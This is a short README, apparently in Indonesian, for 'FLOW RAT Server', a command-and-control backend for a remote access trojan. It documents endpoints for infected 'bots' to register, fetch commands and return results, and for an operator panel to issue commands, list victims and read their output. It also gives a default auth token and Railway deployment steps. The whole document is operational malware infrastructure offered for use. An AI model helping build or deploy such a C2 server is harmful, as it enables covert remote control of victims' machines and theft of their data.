# FLOW RAT Server

C2 backend untuk panel FLOW RAT.

## Endpoint

| Method | Endpoint | Auth | Fungsi |
|--------|----------|------|--------|
| GET | `/` | No | Health check |
| POST | `/rat/register` | No | Bot daftar |
| GET | `/rat/poll/:bot_id` | No | Bot ambil command |
| POST | `/rat/result` | No | Bot kirim hasil |
| POST | `/rat/command` | Yes | Panel kirim command |
| GET | `/rat/bots` | Yes | Panel list bot |
| GET | `/rat/result/:bot_id` | Yes | Panel ambil hasil |
| DELETE | `/rat/bot/:bot_id` | Yes | Hapus bot |
| DELETE | `/rat/queue/:bot_id` | Yes | Clear queue |

Auth via header `x-auth-token` atau query `?token=`.

## Environment Variables

- `PORT` — default 3000
- `AUTH_TOKEN` — default `flow-secret-token-2026`

## Deploy

### Railway
1. Push repo ke GitHub
2. railway.app → New Project → Deploy from GitHub
3. Set env `AUTH_TOKEN` di Settings → Variables
4. Dapat URL: `https://xxxx.up.railway.app`

### Lokal
```bash
npm install
npm start
